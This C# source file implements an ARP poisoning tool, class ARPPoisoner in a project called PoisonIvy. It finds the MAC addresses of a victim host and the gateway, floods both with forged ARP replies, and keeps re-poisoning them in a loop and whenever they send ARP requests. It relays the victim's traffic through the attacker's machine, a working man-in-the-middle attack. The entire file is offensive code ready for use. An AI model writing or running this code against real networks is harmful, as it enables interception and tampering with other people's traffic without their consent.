using System;
using System.Collections.Generic;
using System.Text;
using FM;
using System.Net;
using System.Net.NetworkInformation;

namespace PoisonIvy
{
    class ARPPoisoner : Poisoner
    {
        private INetworkAdapter adapter;

        public ARPPoisoner(INetworkAdapter adapter)
        {
            this.adapter = adapter;
        }

        /// <summary>
        /// Initializes the poisoning session
        /// </summary>
        /// <param name="f">FROM ip address</param>
        /// <param name="t">TO ip address</param>
        public override void poison(IPAddress f, IPAddress t)
        {
            this.from = f;
            this.to = t;
            isWaitingFROM = true;
            isWaitingTO = true;
            
            System.Diagnostics.Debug.WriteLine("Waiting for a packet from " + from.ToString() + " and " + to.ToString());
            
            // ping the two hosts to retrieve their MAC addresses
            Ping ping = new Ping();
            ping.Send(from);
            ping.Send(to);
            while (isWaitingFROM || isWaitingTO) { System.Threading.Thread.Sleep(1000); }

            // setting isPoisoning here allows our packet function to catch ARP requests mid-poison
            isPoisoning = true;

            // poison the gateway first
            System.Diagnostics.Debug.WriteLine("Poisoning gateway at " + to.ToString());
            for (int i = 0; i < 10; ++i)
            {
                adapter.SendPacket(generateARP(from, to, adapter.InterfaceInformation.GetPhysicalAddress(), to_mac));
                System.Threading.Thread.Sleep(500);
            }

            System.Diagnostics.Debug.WriteLine("Poisoning user at " + from.ToString());
            for (int i = 0; i < 10; ++i)
            {
                adapter.SendPacket(generateARP(to, from, adapter.InterfaceInformation.GetPhysicalAddress(), from_mac));
                System.Threading.Thread.Sleep(500);
            }

            System.Diagnostics.Debug.WriteLine("ARP poisoning complete.");
            PoisonLoop ploop = new PoisonLoop(poisonLoop);
            ploop.BeginInvoke(null, null);
        }

        /// <summary>
        /// Once the initial burst of poisoning is all done, sit in this loop and send ARP reply's to the gateway and the victim
        /// system.  This ensures even further that we sustain our spoof.  This is also very noisy.
        /// </summary>
        public delegate void PoisonLoop();
        private void poisonLoop()
        {
            System.Diagnostics.Debug.WriteLine("Entering poison loop.");
            while (isPoisoning)
            {
                adapter.SendPacket(generateARP(from, to, adapter.InterfaceInformation.GetPhysicalAddress(), to_mac));
                adapter.SendPacket(generateARP(to, from, adapter.InterfaceInformation.GetPhysicalAddress(), from_mac));
                System.Threading.Thread.Sleep(1000);
            }
        }

        /// <summary>
        /// Generate and return an ARP packet
        /// </summary>
        /// <param name="from">The FROM address to be used in the ARP layer (user)</param>
        /// <param name="to">The TO address (gateway)</param>
        /// <param name="mFrom">The MAC address of the user (or attacker)</param>
        /// <param name="mTo">The MAC address of the gateway</param>
        /// <returns></returns>
        private ARPPacket generateARP(IPAddress from, IPAddress to, PhysicalAddress mFrom, PhysicalAddress mTo)
        {
            // build the ethernet layer packet
            EthPacket eth = new EthPacket(42);
            eth.FromMac = mFrom.GetAddressBytes();
            eth.ToMac = mTo.GetAddressBytes();
            eth.Proto = new byte[2] { 0x08, 0x06 };

            // build the arp 
            ARPPacket arp = new ARPPacket(eth);
            arp.HardwareSize = 6;
            arp.HardwareType = 1;
            arp.ProtocolType = 0x0800;
            arp.ProtocolSize = 4;
            arp.ASenderIP = from;
            arp.ATargetIP = to;
            arp.ASenderMac = mFrom.GetAddressBytes();
            arp.ATargetMac = mTo.GetAddressBytes();
            arp.Outbound = true;
            arp.ProtocolSize = 0x04;
            // mark it REPLY
            arp.ARPOpcode = 2;

            return arp;
        }

        /// <summary>
        /// Fix our mistakes because we're sorry :(
        /// </summary>
        public void rectifyAttack()
        {
            adapter.SendPacket(generateARP(from, to, from_mac, to_mac));
            adapter.SendPacket(generateARP(to, from, to_mac, from_mac));
        }

        /// <summary>
        /// handle incoming packets
        /// </summary>
        /// <param name="in_packet"></param>
        /// <returns></returns>
        public override PacketMainReturn handlePacket(Packet in_packet)
        {
            PacketMainReturn pmr;
            if (isPoisoning)
            {
                if (in_packet.ContainsLayer(Protocol.Ethernet) && !(in_packet.Outbound))
                {
                    // check if the packet is from our USER; if it is, rewrite the destination MAC to the
                    // router MAC address
                    EthPacket packet = (EthPacket)in_packet;
                    if (new PhysicalAddress(packet.FromMac).ToString().Equals(from_mac.ToString()))
                    {
                        packet.ToMac = to_mac.GetAddressBytes();
                        packet.FromMac = adapter.InterfaceInformation.GetPhysicalAddress().GetAddressBytes();
                        packet.Outbound = true;

                        // send the packet and drop the pmr so the packet isn't processed any further
                        adapter.SendPacket(packet);

                        pmr = new PacketMainReturn("PoisonIvy");
                        pmr.returnType = PacketMainReturnType.Drop;
                        return pmr;
                    }
                    // check for the TO MAC address; if it's from our gateway, then it needs to be forwarded
                    // to our poisoned user
                    if (new PhysicalAddress(packet.FromMac).ToString().Equals(to_mac.ToString()))
                    {
                        // swap out the MAC and forward it
                        packet.ToMac = from_mac.GetAddressBytes();
                        packet.FromMac = adapter.InterfaceInformation.GetPhysicalAddress().GetAddressBytes();
                        packet.Outbound = true;

                        // send the packet and drop the pmr so the packet isn't processed any further
                        adapter.SendPacket(packet);

                        pmr = new PacketMainReturn("PoisonIvy");
                        pmr.returnType = PacketMainReturnType.Drop;
                        return pmr;
                    }
                }

                // repoison if we catch the FROM or TO address making ARP requests to the opposite party
                if (in_packet.ContainsLayer(Protocol.ARP) && !(in_packet.Outbound))
                {
                    ARPPacket request = (ARPPacket)in_packet;
                    // if it's from our FROM ip
                    if (request.ASenderIP.Equals(from))
                    {
                        // if they're requesting the TO ip address, respond. This is a race condition!
                        if (request.ATargetIP.Equals(to))
                        {
                            System.Diagnostics.Debug.WriteLine("repoisoning USER ip " + request.ASenderIP.ToString());
                            for ( int i = 0; i < 10; ++i )
                            {
                                adapter.SendPacket(generateARP(to, request.ASenderIP, 
                                                              adapter.InterfaceInformation.GetPhysicalAddress(), 
                                                              new PhysicalAddress(request.ASenderMac)));
                                System.Threading.Thread.Sleep(500);
                            }
                        }
                    }

                    // if it's from our TO ip
                    if (request.ASenderIP.Equals(to))
                    {
                        if (request.ATargetIP.Equals(from))
                        {
                            System.Diagnostics.Debug.WriteLine("repoisoning GATEWAY ip " + request.ASenderIP.ToString());
                            for (int i = 0; i < 10; ++i)
                            {
                                adapter.SendPacket(generateARP(from, to, adapter.InterfaceInformation.GetPhysicalAddress(),
                                                                         to_mac));
                                System.Threading.Thread.Sleep(500);
                            }
                        }
                    }
                }
            }

            /// if we're waiting for a packet to come through with the FROM address IP, check if this packet is it, and if it is, 
            /// grab the MAC and save it
            if (isWaitingFROM)
            {
                if (in_packet.ContainsLayer(Protocol.IP) && !(in_packet.Outbound)) 
                {
                    IPPacket packet = (IPPacket)in_packet;
                    if (packet.SourceIP.Equals(from))
                    {
                        from_mac = new PhysicalAddress(packet.FromMac);
                        System.Diagnostics.Debug.WriteLine("Caught FROM MAC at: " + from_mac.ToString());
                        isWaitingFROM = false;
                    }
                }
            }

            // likewise above with TO address
            if (isWaitingTO)
            {
                if (in_packet.ContainsLayer(Protocol.IP) && !(in_packet.Outbound))
                {
                    IPPacket packet = (IPPacket)in_packet;
                    if (packet.SourceIP.Equals(to))
                    {
                        to_mac = new PhysicalAddress(packet.FromMac);
                        System.Diagnostics.Debug.WriteLine("Caught TO MAC at: " + to_mac.ToString());
                        isWaitingTO = false;
                    }
                }
            }
            return null;
        }
    }
}
